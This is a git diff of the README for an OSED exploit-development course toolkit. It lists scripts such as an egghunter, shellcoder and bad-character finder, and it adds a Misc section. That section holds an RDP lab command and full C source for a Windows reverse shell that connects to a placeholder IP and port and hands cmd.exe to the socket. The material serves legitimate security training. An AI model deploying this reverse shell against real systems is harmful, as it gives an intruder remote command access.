@@ -1,21 +1,27 @@
-# osed-scripts
+# osed-scripts <!-- omit from toc -->
 bespoke tooling for offensive security's Windows Usermode Exploit Dev course (OSED)
 
-## Table of Contents
+## Table of Contents <!-- omit from toc -->
 
 - [Standalone Scripts](#standalone-scripts)
-    - [egghunter.py](#egghunterpy)
-    - [find-gadgets.py](#find-gadgetspy)
-    - [shellcoder.py](#shellcoderpy)
-    - [install-mona.sh](#install-monash)
-    - [attach-process.ps1](#attach-processps1)
+  - [egghunter.py](#egghunterpy)
+  - [find-gadgets.py](#find-gadgetspy)
+  - [shellcoder.py](#shellcoderpy)
+  - [install-mona.sh](#install-monash)
+  - [attach-process.ps1](#attach-processps1)
 - [WinDbg Scripts](#windbg-scripts)
-    - [find-ppr.py](#find-pprpy)
-    - [find-bad-chars.py](#find-bad-charspy)
-    - [search.py](#searchpy)
+  - [find-ppr.py](#find-pprpy)
+  - [find-bad-chars.py](#find-bad-charspy)
+  - [search.py](#searchpy)
+- [Misc](#misc)
+  - [RDP command](#rdp-command)
+  - [reverse-shell.c](#reverse-shellc)
+  - [Cheatsheets](#cheatsheets)
+    - [IDA Pro](#ida-pro)
+    - [Assembly language](#assembly-language)
 
 ## Standalone Scripts
-### Installation:
+### Installation: <!-- omit from toc -->
 pip3 install keystone-engine numpy
 
 ### egghunter.py
@@ -298,7 +304,7 @@ optional arguments:
   -g, --generate        generate a byte string suitable for use in source code
 ```
 
-#### --address example
+#### --address example <!-- omit from toc -->
 ```
 0:008> !py find-bad-chars.py --address esp+1 --bad 1d --start 1 --end 7f
 0185ff55  01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 
@@ -313,7 +319,7 @@ optional arguments:
           -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
 ...
 ```
-#### --generate example
+#### --generate example <!-- omit from toc -->
 ```
 0:008> !py find-bad-chars.py --generate --bad 1d --start 1
 [+] characters as a range of bytes
@@ -368,3 +374,76 @@ optional arguments:
 01763892  66 66 66 66 66 66 66 66-66 66 66 66 66 66 66 66  ffffffffffffffff
 ...
 ```
+
+## Misc
+
+Other commands / scripts that can be used as reference or to speed up the debugging process.
+
+### RDP command
+
+This command will connect to the target machine via rdp and mount `/home/kali/OSED` on your local machine as `tmp` on the target machine.
+
+```shell
+sudo rdesktop -z -P -x m -u offsec -p lab 192.168.242.10 -r disk:tmp=/home/kali/OSED
+```
+
+### reverse-shell.c
+
+This reverse shell / shellcode is similar to that in [shellcoder.py](#shellcoderpy). We can use this program to better understand what values are required for which parameters. The functions that we want to take note are:
+
+- [WSAStartup()](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup)
+- [WSASocket()](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa)
+- [WSAConnect()](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect)
+- [CreateProcessA()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
+
+```c
+#include <windows.h>  
+#include <stdio.h>  
+#include <winsock2.h>  
+  
+WSADATA wsaData;  
+SOCKET winSock;  
+struct sockaddr_in sockAddr;  
+  
+int port = <your-port>;  
+char *ip = "<your-ip>";  
+  
+STARTUPINFO sinfo;  
+PROCESS_INFORMATION pinfo;  
+  
+int main(int argc, char *argv[]){  
+	int start = WSAStartup(MAKEWORD(2,2), &wsaData);  
+	  
+	winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);  
+	  
+	sockAddr.sin_family = AF_INET;  
+	sockAddr.sin_port = htons(port);  
+	sockAddr.sin_addr.s_addr = inet_addr(ip);  
+	  
+	WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);  
+	  
+	memset(&sinfo, 0, sizeof(sinfo));  
+	sinfo.cb = sizeof(sinfo);  
+	sinfo.dwFlags = STARTF_USESTDHANDLES;  
+	sinfo.hStdError = (HANDLE)winSock;  
+	sinfo.hStdInput = (HANDLE)winSock;  
+	sinfo.hStdOutput = (HANDLE)winSock;  
+	  
+	CreateProcessA(NULL, "cmd.exe", NULL, NULL,TRUE , 0, NULL, NULL, &sinfo, &pinfo);  
+	  
+	return 0;  
+}
+```
+### Cheatsheets
+
+#### IDA Pro
+
+Cheatsheet for WinDbg that I found online: [ida-pro.pdf](pdf/ida-pro.pdf)
+
+![ida pro cheatsheet](img/ida-pro.png)
+
+#### Assembly language
+
+Cheatsheet for assembly instructions that I found [online](https://web.stanford.edu/class/cs107/resources/x86-64-reference.pdf): [assembly-instruction.pdf](pdf/assembly-instruction.pdf)
+
+![assembly instruction cheatsheet](img/assembly-instruction.png)
